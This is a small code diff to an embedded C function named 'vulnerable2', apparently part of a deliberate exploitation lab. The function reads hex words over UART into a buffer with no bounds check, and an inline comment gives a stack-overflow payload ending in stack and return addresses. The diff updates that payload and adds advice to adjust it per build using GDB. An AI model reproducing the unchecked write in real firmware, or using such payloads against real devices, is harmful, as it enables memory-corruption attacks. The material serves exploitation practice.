@@ -160,7 +160,8 @@ void vulnerable2(void) {
     uart_send_string("Enter 32-bit words in hex, end with newline:\r\n");
 
     while (1) {
-        uint32_t word = uart_read_hex_word(); //payload input: "11111111 22222222 33333333 44444444 55555555 66666666 77777777 88888888 88888888 00000009 20007ff0 000002e1\r"
+        uint32_t word = uart_read_hex_word(); //payload input: "11111111 22222222 33333333 44444444 55555555 66666666 77777777 88888888 88888888 00000009 20007ff0 000002e9\r"
+        //Note this payload may change every build due to ASLR, so adjust the last two words accordingly based on the observed stack layout in GDB.
         buffer[i] = word;   // normal-looking indexed input
         i++;
         if (uart_last_char_was_newline()) {
